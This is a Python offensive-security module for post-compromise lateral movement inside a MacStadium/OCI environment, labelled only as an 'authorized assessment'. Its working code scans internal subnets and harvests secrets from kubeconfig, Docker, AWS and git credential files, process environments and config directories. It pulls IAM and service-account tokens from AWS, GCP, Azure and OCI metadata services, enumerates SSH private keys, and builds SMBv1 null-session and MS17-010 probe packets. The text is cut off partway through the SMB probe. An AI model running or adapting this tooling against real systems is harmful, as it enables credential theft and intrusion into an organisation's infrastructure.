#!/usr/bin/env python3
"""
Lateral Movement Module
Synthesized from:
  - Violent Python (TJ O'Connor) — TCP connect scan, SSH botnet patterns, port scanner
  - Black Hat Python 2nd Ed. (Justin Seitz) — pure-socket networking, no-tool-dependency principle
  - Penetration Testing (Georgia Weidman) — post-exploitation credential harvesting, lateral pivot
  - Network Attacks and Exploitation (Matthew Monte) — attacker friction reduction, parallel coverage

Post-compromise internal recon inside a MacStadium/OCI environment:
  - ARP/route table parsing
  - Pure-Python TCP connect subnet scan
  - Credential harvesting from filesystem
  - Cloud metadata service probing (AWS/GCP/Azure/OCI)
  - SSH key enumeration and known_hosts extraction
  - Running-process secret extraction via /proc

Authorized assessment context.
"""

import os
import re
import socket
import struct
import platform as _platform
import subprocess
import threading
import ipaddress
import urllib.request
import urllib.error
import base64
import math
import stat
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

_IS_LINUX = _platform.system() == 'Linux'
_IS_MACOS = _platform.system() == 'Darwin'

# Ports that tend to surface AI/ML infra, SSH, web, and databases
SCAN_PORTS = [22, 80, 443, 2375, 2376, 5432, 6379, 8080, 8443, 9200, 9300, 27017]

# MacStadium internal DNS names (Orka control plane + common CI/CD)
MACSTADIUM_INTERNAL_NAMES = [
    'orka-api', 'harbor', 'registry', 'vault', 'jenkins', 'gitlab',
    'nexus', 'artifactory', 'consul', 'nomad', 'pki', 'ldap',
    'nfs', 'storage', 'backup', 'mgmt', 'bastion',
]

# Regex patterns for secrets in environment and config files
_SECRET_RE = re.compile(
    r'(TOKEN|SECRET|PASSWORD|PASSWD|PASS|API_KEY|APIKEY|CREDENTIAL|CRED|'
    r'ACCESS_KEY|SECRET_KEY|PRIVATE_KEY|AUTH_TOKEN|BEARER|'
    r'DB_PASS|DATABASE_URL|POSTGRES|MYSQL|REDIS_URL|MONGO_URI)',
    re.IGNORECASE
)


# ---------------------------------------------------------------------------
# 1. Internal network discovery
# ---------------------------------------------------------------------------

class NetworkDiscovery:
    """ARP table, routes, subnet scan, internal DNS."""

    def __init__(self):
        self.arp_table = []
        self.routes = []
        self.live_hosts = {}      # ip -> {port: banner}
        self.dns_hits = {}

    def enumerate_all(self, scan_timeout=0.5, max_workers=100):
        self.parse_arp_table()
        self.parse_route_table()
        subnets = self._derive_subnets()
        if subnets:
            self.scan_subnets(subnets, timeout=scan_timeout, max_workers=max_workers)
        self.resolve_internal_names()
        return self

    # -- ARP --

    def parse_arp_table(self):
        """Read ARP cache. Linux: /proc/net/arp; fallback: arp -a."""
        if _IS_LINUX:
            try:
                with open('/proc/net/arp') as f:
                    for line in f.readlines()[1:]:
                        parts = line.split()
                        if len(parts) >= 4:
                            ip, hw_type, flags, mac = parts[0], parts[1], parts[2], parts[3]
                            if mac != '00:00:00:00:00:00':
                                self.arp_table.append({
                                    'ip': ip, 'mac': mac,
                                    'type': hw_type, 'flags': flags
                                })
                return
            except Exception:
                pass
        # macOS / fallback
        try:
            result = subprocess.run(
                ['arp', '-a'], capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                m = re.search(r'\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-f:]+)', line, re.I)
                if m:
                    self.arp_table.append({'ip': m.group(1), 'mac': m.group(2)})
        except Exception:
            pass

    # -- Routes --

    def parse_route_table(self):
        """Read routing table. Linux: /proc/net/route; fallback: netstat -rn."""
        if _IS_LINUX:
            try:
                with open('/proc/net/route') as f:
                    for line in f.readlines()[1:]:
                        parts = line.split()
                        if len(parts) < 8:
                            continue
                        iface = parts[0]
                        dest_hex = parts[1]
                        gw_hex = parts[2]
                        flags = int(parts[3], 16)
                        mask_hex = parts[7]
                        dest = socket.inet_ntoa(struct.pack('<I', int(dest_hex, 16)))
                        gw = socket.inet_ntoa(struct.pack('<I', int(gw_hex, 16)))
                        mask = socket.inet_ntoa(struct.pack('<I', int(mask_hex, 16)))
                        self.routes.append({
                            'iface': iface, 'dest': dest, 'gw': gw,
                            'mask': mask, 'flags': flags
                        })
                return
            except Exception:
                pass
        try:
            result = subprocess.run(
                ['netstat', '-rn'], capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 4 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
                    self.routes.append({
                        'dest': parts[0],
                        'gw': parts[1],
                        'mask': parts[2] if len(parts) > 2 else '',
                        'iface': parts[-1]
                    })
        except Exception:
            pass

    def _derive_subnets(self):
        """Derive /24 subnets from routes and local interfaces."""
        subnets = set()
        # From routes: skip default (dest==0.0.0.0) and loopback
        for r in self.routes:
            dest = r.get('dest', '')
            mask = r.get('mask', '')
            if dest in ('0.0.0.0', '127.0.0.0', ''):
                continue
            try:
                net = ipaddress.IPv4Network(f'{dest}/{mask}', strict=False)
                if net.prefixlen >= 8:
                    subnets.add(str(net))
            except Exception:
                pass
        # Fallback: infer /24 from ARP entries
        if not subnets:
            for entry in self.arp_table:
                ip = entry.get('ip', '')
                try:
                    net = ipaddress.IPv4Network(f'{ip}/24', strict=False)
                    subnets.add(str(net))
                except Exception:
                    pass
        return list(subnets)

    # -- TCP connect scan (no nmap) --

    def _probe(self, ip: str, port: int, timeout: float):
        """Single TCP connect probe. Returns (ip, port, banner) or None."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            # Grab banner if available
            banner = b''
            try:
                s.send(b'\r\n')
                banner = s.recv(256)
            except Exception:
                pass
            s.close()
            return ip, port, banner.decode(errors='replace').strip()[:120]
        except Exception:
            return None

    def scan_subnets(self, subnets, ports=None, timeout=0.5, max_workers=100):
        """Pure-Python TCP connect scan. Violent Python ch2 pattern extended."""
        ports = ports or SCAN_PORTS
        tasks = []
        for subnet_str in subnets:
            try:
                net = ipaddress.IPv4Network(subnet_str, strict=False)
                # Cap at /16 to avoid runaway scans
                if net.num_addresses > 65536:
                    continue
                for host in net.hosts():
                    ip = str(host)
                    for p in ports:
                        tasks.append((ip, p))
            except Exception:
                continue

        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(self._probe, ip, port, timeout): (ip, port)
                       for ip, port in tasks}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    ip, port, banner = result
                    if ip not in self.live_hosts:
                        self.live_hosts[ip] = {}
                    self.live_hosts[ip][port] = banner

    # -- Internal DNS --

    def resolve_internal_names(self, names=None):
        """Resolve MacStadium-typical internal hostnames."""
        names = names or MACSTADIUM_INTERNAL_NAMES
        for name in names:
            try:
                ip = socket.gethostbyname(name)
                self.dns_hits[name] = ip
            except Exception:
                pass

    def report_lines(self):
        lines = ['--- Network Discovery ---']
        lines.append(f'ARP entries: {len(self.arp_table)}')
        for e in self.arp_table:
            lines.append(f"  {e['ip']:15s}  {e.get('mac', '?')}")
        lines.append(f'Routes: {len(self.routes)}')
        for r in self.routes:
            lines.append(f"  {r['dest']:15s} gw {r.get('gw','?'):15s} {r.get('iface','?')}")
        lines.append(f'Live hosts: {len(self.live_hosts)}')
        for ip in sorted(self.live_hosts):
            ports = sorted(self.live_hosts[ip].keys())
            lines.append(f'  {ip}: {ports}')
            for p in ports:
                b = self.live_hosts[ip][p]
                if b:
                    lines.append(f'    :{p} => {b[:80]}')
        lines.append(f'DNS hits: {len(self.dns_hits)}')
        for name, ip in self.dns_hits.items():
            lines.append(f'  {name} -> {ip}')
        return lines


# ---------------------------------------------------------------------------
# 2. Credential harvesting
# ---------------------------------------------------------------------------

class CredentialHarvester:
    """Filesystem and process credential extraction."""

    def __init__(self):
        self.findings = []

    def harvest_all(self):
        self._read_kube_config()
        self._read_docker_config()
        self._read_aws_credentials()
        self._read_gitconfig()
        self._read_cloud_instance_data()
        self._read_proc_environ()
        self._read_proc_cmdlines()
        self._scan_config_dirs()
        return self.findings

    def _add(self, source, data, severity='MEDIUM'):
        if data:
            self.findings.append({'source': source, 'data': data, 'severity': severity})

    # -- Kubernetes --

    def _read_kube_config(self):
        paths = [
            Path.home() / '.kube' / 'config',
            Path('/root/.kube/config'),
            Path('/var/run/secrets/kubernetes.io/serviceaccount/token'),
        ]
        for p in paths:
            try:
                content = p.read_text(errors='replace')
                tokens = re.findall(r'token:\s*(\S+)', content)
                certs = re.findall(r'certificate-authority-data:\s*(\S+)', content)
                servers = re.findall(r'server:\s*(https?://\S+)', content)
                if tokens or servers:
                    self._add(str(p), {
                        'type': 'kubernetes',
                        'servers': servers,
                        'token_count': len(tokens),
                        'tokens': [t[:40] + '...' if len(t) > 40 else t for t in tokens],
                        'has_certs': bool(certs)
                    }, severity='CRITICAL')
            except Exception:
                pass

    # -- Docker --

    def _read_docker_config(self):
        paths = [Path.home() / '.docker' / 'config.json', Path('/root/.docker/config.json')]
        for p in paths:
            try:
                content = p.read_text(errors='replace')
                auths = re.findall(r'"auth"\s*:\s*"([^"]+)"', content)
                decoded = []
                for a in auths:
                    try:
                        decoded.append(base64.b64decode(a).decode(errors='replace'))
                    except Exception:
                        decoded.append(a)
                registries = re.findall(r'"(https?://[^"]+)"', content)
                if auths:
                    self._add(str(p), {
                        'type': 'docker_registry',
                        'registries': registries,
                        'decoded_auths': decoded
                    }, severity='CRITICAL')
            except Exception:
                pass

    # -- AWS --

    def _read_aws_credentials(self):
        paths = [
            Path.home() / '.aws' / 'credentials',
            Path('/root/.aws/credentials'),
        ]
        for p in paths:
            try:
                content = p.read_text(errors='replace')
                keys = re.findall(r'aws_access_key_id\s*=\s*(\S+)', content)
                secrets = re.findall(r'aws_secret_access_key\s*=\s*(\S+)', content)
                tokens = re.findall(r'aws_session_token\s*=\s*(\S+)', content)
                if keys:
                    self._add(str(p), {
                        'type': 'aws_credentials',
                        'access_keys': keys,
                        'secret_key_count': len(secrets),
                        'has_session_token': bool(tokens)
                    }, severity='CRITICAL')
            except Exception:
                pass

    # -- Git --

    def _read_gitconfig(self):
        paths = [Path.home() / '.gitconfig', Path('/root/.gitconfig')]
        for p in paths:
            try:
                content = p.read_text(errors='replace')
                urls = re.findall(r'url\s*=\s*(\S+)', content)
                # Strip embedded creds from URLs like https://user:pass@host
                embedded = [u for u in urls if '@' in u and '//' in u]
                if embedded:
                    self._add(str(p), {
                        'type': 'git_credentials',
                        'urls_with_creds': embedded
                    }, severity='HIGH')
            except Exception:
                pass
        # git credential store
        cred_store = Path.home() / '.git-credentials'
        try:
            content = cred_store.read_text(errors='replace')
            lines = [l.strip() for l in content.splitlines() if l.strip()]
            if lines:
                self._add(str(cred_store), {
                    'type': 'git_credential_store',
                    'entries': lines
                }, severity='CRITICAL')
        except Exception:
            pass

    # -- Cloud instance metadata files --

    def _read_cloud_instance_data(self):
        targets = [
            '/etc/machine-id',
            '/var/lib/cloud/instance/user-data.txt',
            '/var/lib/cloud/instance/vendor-data.txt',
            '/var/lib/cloud/instance/obj.pkl',
            '/run/cloud-init/instance-data.json',
            '/etc/cloud/cloud.cfg',
        ]
        for path in targets:
            p = Path(path)
            try:
                content = p.read_text(errors='replace')
                if len(content) > 2:
                    severity = 'HIGH' if 'user-data' in path or 'instance-data' in path else 'LOW'
                    hit_patterns = _SECRET_RE.findall(content)
                    self._add(path, {
                        'type': 'cloud_metadata_file',
                        'size': len(content),
                        'secret_patterns': list(set(hit_patterns)),
                        'preview': content[:300]
                    }, severity=severity if hit_patterns else 'LOW')
            except Exception:
                pass

    # -- /proc/*/environ --

    def _read_proc_environ(self):
        """Scan process environment variables for secrets. Linux only."""
        if not _IS_LINUX:
            return
        hits = []
        try:
            for pid_dir in Path('/proc').iterdir():
                if not pid_dir.name.isdigit():
                    continue
                env_file = pid_dir / 'environ'
                try:
                    raw = env_file.read_bytes()
                    env_str = raw.replace(b'\x00', b'\n').decode(errors='replace')
                    for line in env_str.splitlines():
                        if '=' in line:
                            key, _, val = line.partition('=')
                            if _SECRET_RE.search(key) and val:
                                hits.append({
                                    'pid': pid_dir.name,
                                    'key': key,
                                    'value': val[:120]
                                })
                except Exception:
                    pass
        except Exception:
            pass
        if hits:
            self._add('/proc/*/environ', {'type': 'process_env_secrets', 'hits': hits},
                      severity='CRITICAL')

    # -- /proc/*/cmdline --

    def _read_proc_cmdlines(self):
        """Scan process command lines for embedded credentials. Linux only."""
        if not _IS_LINUX:
            return
        hits = []
        try:
            for pid_dir in Path('/proc').iterdir():
                if not pid_dir.name.isdigit():
                    continue
                cmd_file = pid_dir / 'cmdline'
                try:
                    raw = cmd_file.read_bytes()
                    cmdline = raw.replace(b'\x00', b' ').decode(errors='replace').strip()
                    if _SECRET_RE.search(cmdline):
                        hits.append({'pid': pid_dir.name, 'cmdline': cmdline[:300]})
                except Exception:
                    pass
        except Exception:
            pass
        if hits:
            self._add('/proc/*/cmdline', {'type': 'cmdline_secrets', 'hits': hits},
                      severity='HIGH')

    # -- Config dirs --

    def _scan_config_dirs(self):
        """Scan common config directories for credentials."""
        search_roots = [
            Path.home() / '.config',
            Path('/opt'),
            Path('/etc'),
            Path('/var/lib'),
        ]
        config_exts = {'.json', '.yaml', '.yml', '.toml', '.ini', '.conf', '.cfg', '.env'}
        max_files = 500
        scanned = 0

        for root in search_roots:
            if not root.exists():
                continue
            try:
                for p in root.rglob('*'):
                    if scanned >= max_files:
                        break
                    if not p.is_file():
                        continue
                    if p.suffix.lower() not in config_exts and p.name not in ('.env', 'credentials'):
                        continue
                    scanned += 1
                    try:
                        content = p.read_text(errors='replace')
                        matches = _SECRET_RE.findall(content)
                        if matches:
                            self._add(str(p), {
                                'type': 'config_file',
                                'patterns': list(set(matches)),
                                'preview': content[:400]
                            }, severity='HIGH')
                    except Exception:
                        pass
            except Exception:
                pass

    def report_lines(self):
        lines = ['--- Credential Harvester ---']
        lines.append(f'Findings: {len(self.findings)}')
        sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        for f in sorted(self.findings, key=lambda x: sev_order.get(x['severity'], 4)):
            lines.append(f"  [{f['severity']}] {f['source']}")
            d = f['data']
            if isinstance(d, dict):
                t = d.get('type', '')
                lines.append(f"    type: {t}")
                for k, v in d.items():
                    if k == 'type':
                        continue
                    if isinstance(v, list) and len(v) > 5:
                        lines.append(f"    {k}: {v[:5]} ... ({len(v)} total)")
                    elif k in ('preview', 'cmdline') and isinstance(v, str) and len(v) > 120:
                        lines.append(f"    {k}: {v[:120]}...")
                    else:
                        lines.append(f"    {k}: {v}")
        return lines


# ---------------------------------------------------------------------------
# 3. Cloud metadata service probing
# ---------------------------------------------------------------------------

class CloudMetadataProber:
    """AWS IMDSv1/v2, GCP, Azure, OCI metadata endpoints."""

    TIMEOUT = 2

    def __init__(self):
        self.results = {}

    def probe_all(self):
        self._probe_aws()
        self._probe_gcp()
        self._probe_azure()
        self._probe_oci()
        return self.results

    def _get(self, url, headers=None, method='GET', body=None):
        try:
            req = urllib.request.Request(url, headers=headers or {}, method=method,
                                         data=body)
            with urllib.request.urlopen(req, timeout=self.TIMEOUT) as resp:
                return resp.status, resp.read(4096).decode(errors='replace')
        except urllib.error.URLError:
            return None, None
        except Exception:
            return None, None

    def _probe_aws(self):
        base = 'http://169.254.169.254'

        # IMDSv1
        status, body = self._get(f'{base}/latest/meta-data/')
        if status == 200:
            self.results['aws_imdsv1'] = {
                'status': 'OPEN',
                'keys': body.splitlines() if body else [],
            }
            # Grab IAM role credentials
            _, iam_list = self._get(f'{base}/latest/meta-data/iam/security-credentials/')
            if iam_list:
                role = iam_list.strip().splitlines()[0] if iam_list.strip() else None
                if role:
                    _, creds = self._get(
                        f'{base}/latest/meta-data/iam/security-credentials/{role}')
                    self.results['aws_iam_creds'] = {
                        'role': role,
                        'credentials_json': creds
                    }
        else:
            self.results['aws_imdsv1'] = {'status': 'BLOCKED'}

        # IMDSv2
        status2, token = self._get(
            f'{base}/latest/api/token',
            headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'},
            method='PUT'
        )
        if status2 == 200 and token:
            status3, body3 = self._get(
                f'{base}/latest/meta-data/',
                headers={'X-aws-ec2-metadata-token': token.strip()}
            )
            self.results['aws_imdsv2'] = {
                'status': 'OPEN' if status3 == 200 else 'BLOCKED',
                'token_obtained': True,
                'keys': body3.splitlines() if body3 else []
            }
        else:
            self.results['aws_imdsv2'] = {'status': 'BLOCKED', 'token_obtained': False}

    def _probe_gcp(self):
        url = 'http://metadata.google.internal/computeMetadata/v1/?recursive=true'
        status, body = self._get(url, headers={'Metadata-Flavor': 'Google'})
        if status == 200:
            # Try to grab service account token
            _, tok = self._get(
                'http://metadata.google.internal/computeMetadata/v1/'
                'instance/service-accounts/default/token',
                headers={'Metadata-Flavor': 'Google'}
            )
            self.results['gcp_metadata'] = {
                'status': 'OPEN',
                'preview': body[:800] if body else '',
                'service_account_token': tok
            }
        else:
            self.results['gcp_metadata'] = {'status': 'BLOCKED'}

    def _probe_azure(self):
        url = ('http://169.254.169.254/metadata/instance'
               '?api-version=2021-02-01&format=json')
        status, body = self._get(url, headers={'Metadata': 'true'})
        if status == 200:
            # Try managed identity token
            _, id_tok = self._get(
                'http://169.254.169.254/metadata/identity/oauth2/token'
                '?api-version=2018-02-01&resource=https://management.azure.com/',
                headers={'Metadata': 'true'}
            )
            self.results['azure_imds'] = {
                'status': 'OPEN',
                'instance_json': body,
                'managed_identity_token': id_tok
            }
        else:
            self.results['azure_imds'] = {'status': 'BLOCKED'}

    def _probe_oci(self):
        """OCI IMDS v2 — MacStadium uses OCI Jeddah per spof-assessment."""
        base = 'http://169.254.169.254'
        # OCI v2 requires authorization header with token
        _, token = self._get(
            f'{base}/opc/v2/instance/',
            headers={'Authorization': 'Bearer Oracle'},
        )
        status, body = self._get(
            f'{base}/opc/v2/instance/',
            headers={'Authorization': 'Bearer Oracle'}
        )
        if status == 200:
            # Grab credentials endpoint
            _, creds = self._get(
                f'{base}/opc/v2/identity/cert.pem',
                headers={'Authorization': 'Bearer Oracle'}
            )
            self.results['oci_imds'] = {
                'status': 'OPEN',
                'instance_json': body,
                'cert_pem': creds
            }
        else:
            # Try v1 fallback
            status_v1, body_v1 = self._get(f'{base}/opc/v1/instance/')
            self.results['oci_imds'] = {
                'status': 'OPEN_V1' if status_v1 == 200 else 'BLOCKED',
                'v1_body': body_v1
            }

    def report_lines(self):
        lines = ['--- Cloud Metadata Probing ---']
        for svc, data in self.results.items():
            status = data.get('status', '?')
            mark = '[OPEN]' if 'OPEN' in status else '[blocked]'
            lines.append(f'  {mark} {svc}')
            if 'OPEN' in status:
                for k, v in data.items():
                    if k == 'status':
                        continue
                    if v and isinstance(v, str) and len(v) > 200:
                        lines.append(f'    {k}: {v[:200]}...')
                    elif v:
                        lines.append(f'    {k}: {v}')
        return lines


# ---------------------------------------------------------------------------
# 4. SSH key enumeration
# ---------------------------------------------------------------------------

class SSHKeyEnumerator:
    """Locate private keys, check permissions, parse known_hosts."""

    KEY_NAMES = ['id_rsa', 'id_ecdsa', 'id_ed25519', 'id_dsa',
                 'identity', 'id_rsa_*', 'id_ecdsa_*']

    def __init__(self):
        self.private_keys = []
        self.known_hosts = []

    def enumerate_all(self):
        self._find_keys()
        self._parse_known_hosts()
        return self

    def _find_keys(self):
        search_dirs = []

        def _try_add(p):
            try:
                if p.exists():
                    search_dirs.append(p)
            except Exception:
                pass

        _try_add(Path.home() / '.ssh')
        _try_add(Path('/root/.ssh'))
        try:
            for p in Path('/home').iterdir():
                _try_add(p / '.ssh')
        except Exception:
            pass

        key_patterns = re.compile(
            r'^(id_rsa|id_ecdsa|id_ed25519|id_dsa|identity)$', re.I
        )

        for ssh_dir in search_dirs:
            try:
                for entry in ssh_dir.iterdir():
                    if entry.is_file() and not entry.suffix == '.pub':
                        if key_patterns.match(entry.name) or entry.name.startswith('id_'):
                            try:
                                content = entry.read_text(errors='replace')
                                if 'PRIVATE KEY' in content or 'BEGIN RSA' in content:
                                    st = entry.stat()
                                    mode = st.st_mode
                                    world_readable = bool(mode & stat.S_IROTH)
                                    group_readable = bool(mode & stat.S_IRGRP)
                                    # Try to find matching public key
                                    pub = Path(str(entry) + '.pub')
                                    fingerprint = None
                                    if pub.exists():
                                        pub_content = pub.read_text(errors='replace').strip()
                                        fingerprint = pub_content[:80]
                                    self.private_keys.append({
                                        'path': str(entry),
                                        'mode': oct(mode),
                                        'world_readable': world_readable,
                                        'group_readable': group_readable,
                                        'encrypted': 'ENCRYPTED' in content or 'Proc-Type' in content,
                                        'fingerprint': fingerprint,
                                        'type': self._detect_key_type(content),
                                    })
                            except Exception:
                                pass
            except Exception:
                pass

    def _detect_key_type(self, content):
        if 'RSA PRIVATE KEY' in content or 'BEGIN RSA' in content:
            return 'rsa'
        if 'EC PRIVATE KEY' in content or 'ECDSA' in content:
            return 'ecdsa'
        if 'OPENSSH PRIVATE KEY' in content:
            # Modern OpenSSH format — type embedded in blob
            return 'openssh'
        if 'DSA PRIVATE KEY' in content:
            return 'dsa'
        return 'unknown'

    def _parse_known_hosts(self):
        known_hosts_paths = []

        def _try_add(p):
            try:
                if p.exists():
                    known_hosts_paths.append(p)
            except Exception:
                pass

        _try_add(Path.home() / '.ssh' / 'known_hosts')
        _try_add(Path('/root/.ssh/known_hosts'))
        try:
            for p in Path('/home').iterdir():
                _try_add(p / '.ssh' / 'known_hosts')
        except Exception:
            pass

        for kh_path in known_hosts_paths:
            try:
                for line in kh_path.read_text(errors='replace').splitlines():
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    # Hashed entries start with |1|
                    if line.startswith('|1|'):
                        self.known_hosts.append({
                            'source': str(kh_path),
                            'host': '[hashed]',
                            'raw': line[:80]
                        })
                        continue
                    parts = line.split()
                    if len(parts) >= 3:
                        host_field = parts[0]
                        key_type = parts[1]
                        hosts = host_field.split(',')
                        for h in hosts:
                            # Strip port bracket notation [host]:port
                            m = re.match(r'\[([^\]]+)\]:(\d+)', h)
                            if m:
                                h = m.group(1)
                                port = m.group(2)
                            else:
                                port = '22'
                            self.known_hosts.append({
                                'source': str(kh_path),
                                'host': h,
                                'port': port,
                                'key_type': key_type
                            })
            except Exception:
                pass

    def report_lines(self):
        lines = ['--- SSH Key Enumeration ---']
        lines.append(f'Private keys found: {len(self.private_keys)}')
        for k in self.private_keys:
            severity = 'CRITICAL' if k['world_readable'] else ('HIGH' if not k['encrypted'] else 'MEDIUM')
            enc = 'encrypted' if k['encrypted'] else 'PLAINTEXT'
            perm_warn = ' [WORLD-READABLE!]' if k['world_readable'] else ''
            lines.append(f"  [{severity}] {k['path']} ({k['type']}, {enc}){perm_warn}")
            if k['fingerprint']:
                lines.append(f"    pubkey: {k['fingerprint']}")
        lines.append(f'known_hosts entries: {len(self.known_hosts)}')
        seen = set()
        for e in self.known_hosts:
            h = e.get('host', '?')
            if h not in seen and h != '[hashed]':
                seen.add(h)
                lines.append(f"  {h}:{e.get('port','22')} ({e.get('key_type','?')})")
        if any(e['host'] == '[hashed]' for e in self.known_hosts):
            n = sum(1 for e in self.known_hosts if e['host'] == '[hashed]')
            lines.append(f'  ... {n} hashed entries (use ssh-keygen -F to test)')
        return lines


# ---------------------------------------------------------------------------
# 5. API token / running service detection
# ---------------------------------------------------------------------------

class APITokenDetector:
    """Docker socket, K8s service account, running-process secret scan."""

    def __init__(self):
        self.findings = []

    def detect_all(self):
        self._check_docker_socket()
        self._check_k8s_sa_token()
        self._scan_proc_for_tokens()
        return self.findings

    def _check_docker_socket(self):
        docker_sock = Path('/var/run/docker.sock')
        if docker_sock.exists():
            st = docker_sock.stat()
            accessible = os.access('/var/run/docker.sock', os.R_OK | os.W_OK)
            containers = None
            if accessible:
                try:
                    # HTTP over Unix socket — pure Python, no docker SDK needed
                    import http.client
                    class UnixHTTPConnection(http.client.HTTPConnection):
                        def __init__(self, path):
                            super().__init__('localhost')
                            self.path = path
                        def connect(self):
                            import socket as _sock
                            self.sock = _sock.socket(_sock.AF_UNIX, _sock.SOCK_STREAM)
                            self.sock.connect(self.path)
                    conn = UnixHTTPConnection('/var/run/docker.sock')
                    conn.request('GET', '/containers/json?all=1')
                    resp = conn.getresponse()
                    containers = resp.read(8192).decode(errors='replace')
                    conn.close()
                except Exception:
                    pass
            self.findings.append({
                'source': '/var/run/docker.sock',
                'type': 'docker_socket',
                'severity': 'CRITICAL' if accessible else 'HIGH',
                'accessible': accessible,
                'mode': oct(st.st_mode),
                'containers_json': containers
            })

    def _check_k8s_sa_token(self):
        sa_dir = Path('/var/run/secrets/kubernetes.io/serviceaccount')
        if sa_dir.exists():
            token_file = sa_dir / 'token'
            ca_file = sa_dir / 'ca.crt'
            ns_file = sa_dir / 'namespace'
            token, namespace, ca = None, None, None
            try:
                token = token_file.read_text().strip()
            except Exception:
                pass
            try:
                namespace = ns_file.read_text().strip()
            except Exception:
                pass
            try:
                ca = ca_file.read_text()[:200]
            except Exception:
                pass
            self.findings.append({
                'source': str(sa_dir),
                'type': 'k8s_service_account',
                'severity': 'CRITICAL' if token else 'HIGH',
                'token': token[:80] + '...' if token and len(token) > 80 else token,
                'namespace': namespace,
                'has_ca': bool(ca)
            })

    def _scan_proc_for_tokens(self):
        """Second pass: scan /proc env for token patterns (complements CredentialHarvester)."""
        if not _IS_LINUX:
            return
        patterns = re.compile(
            r'(BEARER_TOKEN|JWT|API_TOKEN|SLACK_TOKEN|GITHUB_TOKEN|'
            r'OPENAI_API_KEY|ANTHROPIC_API_KEY|STRIPE_SECRET|TWILIO)',
            re.IGNORECASE
        )
        hits = []
        try:
            for pid_dir in Path('/proc').iterdir():
                if not pid_dir.name.isdigit():
                    continue
                try:
                    raw = (pid_dir / 'environ').read_bytes()
                    env_str = raw.replace(b'\x00', b'\n').decode(errors='replace')
                    for line in env_str.splitlines():
                        if '=' in line:
                            key, _, val = line.partition('=')
                            if patterns.search(key) and val:
                                hits.append({'pid': pid_dir.name, 'key': key,
                                             'value': val[:120]})
                except Exception:
                    pass
        except Exception:
            pass
        if hits:
            self.findings.append({
                'source': '/proc/*/environ',
                'type': 'api_token_in_proc',
                'severity': 'CRITICAL',
                'hits': hits
            })

    def report_lines(self):
        lines = ['--- API Token Detection ---']
        for f in self.findings:
            lines.append(f"  [{f['severity']}] {f['source']} ({f['type']})")
            for k, v in f.items():
                if k in ('source', 'type', 'severity'):
                    continue
                if isinstance(v, list) and len(v) > 3:
                    lines.append(f"    {k}: {v[:3]} ... ({len(v)} total)")
                elif isinstance(v, str) and len(v) > 150:
                    lines.append(f"    {k}: {v[:150]}...")
                elif v is not None:
                    lines.append(f"    {k}: {v}")
        return lines


# ---------------------------------------------------------------------------
# 6. Remote Windows lateral movement surface enumeration
# ---------------------------------------------------------------------------

# SMBv1 dialect list sent in Negotiate request
_SMB_DIALECTS = b'\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LM 0.12\x00'


def _build_smb_negotiate() -> bytes:
    """Build NetBIOS session + SMBv1 Negotiate request (3 dialects)."""
    body = (
        b'\xffSMB'              # SMB magic
        b'\x72'                 # SMB_COM_NEGOTIATE
        b'\x00\x00\x00\x00'    # NT status
        b'\x18'                 # flags
        b'\x07\xc0'             # flags2: unicode, long names, NT status
        b'\x00\x00'             # PID high
        b'\x00\x00\x00\x00\x00\x00\x00\x00'  # signature (8 bytes)
        b'\x00\x00'             # reserved
        b'\x00\x00'             # tree ID
        b'\xff\xfe'             # PID
        b'\x00\x00'             # user ID
        b'\x40\x00'             # multiplex ID
        b'\x00'                 # word count = 0
    ) + struct.pack('<H', len(_SMB_DIALECTS)) + _SMB_DIALECTS
    n = len(body)
    nb_hdr = bytes([0x00, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])
    return nb_hdr + body


def _build_smb_session_setup_null(uid: int = 0) -> bytes:
    """Build SMB_COM_SESSION_SETUP_ANDX with empty ANSI/Unicode passwords."""
    byte_data = (
        b'\x00'                              # ANSI password (0 bytes)
        b'\x00\x00'                          # Unicode password (0 bytes, aligned)
        b'WORKGROUP\x00'                     # Primary domain
        b'Windows 2000\x00'                  # Native OS
        b'Windows 2000 LAN Manager\x00'      # Native LAN Manager
    )
    # 13 WORDs = 26 bytes of parameter block
    words = (
        b'\x0d'                 # WordCount = 13
        b'\xff'                 # AndXCommand (0xFF = none)
        b'\x00'                 # AndXReserved
        b'\x00\x00'             # AndXOffset
        b'\x04\x10'             # MaxBufferSize = 4100 (LE)
        b'\x32\x00'             # MaxMpxCount = 50
        b'\x01\x00'             # VcNumber = 1
        b'\x00\x00\x00\x00'    # SessionKey
        b'\x00\x00'             # ANSIPasswordLength = 0
        b'\x00\x00'             # UnicodePasswordLength = 0
        b'\x00\x00\x00\x00'    # Reserved
        b'\x40\x00\x00\x00'    # Capabilities = CAP_NT_SMBS
    ) + struct.pack('<H', len(byte_data)) + byte_data
    smb = (
        b'\xffSMB'
        b'\x73'                 # SMB_COM_SESSION_SETUP_ANDX
        b'\x00\x00\x00\x00'    # NT status
        b'\x18'                 # flags
        b'\x07\xc0'             # flags2
        b'\x00\x00'             # PID high
        b'\x00\x00\x00\x00\x00\x00\x00\x00'  # signature
        b'\x00\x00'             # reserved
        b'\x00\x00'             # tree ID
        b'\xff\xfe'             # PID
    ) + struct.pack('<H', uid) + b'\x41\x00'  # user ID + multiplex ID
    body = smb + words
    n = len(body)
    nb_hdr = bytes([0x00, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])
    return nb_hdr + body


def _build_smb_trans2_probe(uid: int = 0, tid: int = 0) -> bytes:
    """Trans2 SESSION_SETUP probe — distinctive response on unpatched MS17-010 path."""
    setup = struct.pack('<H', 0x000e)           # subcommand: SESSION_SETUP
    words = (
        b'\x0f'                 # WordCount = 15
        b'\x00\x00'             # TotalParameterCount
        b'\x00\x00'             # TotalDataCount
        b'\x0a\x00'             # MaxParameterCount
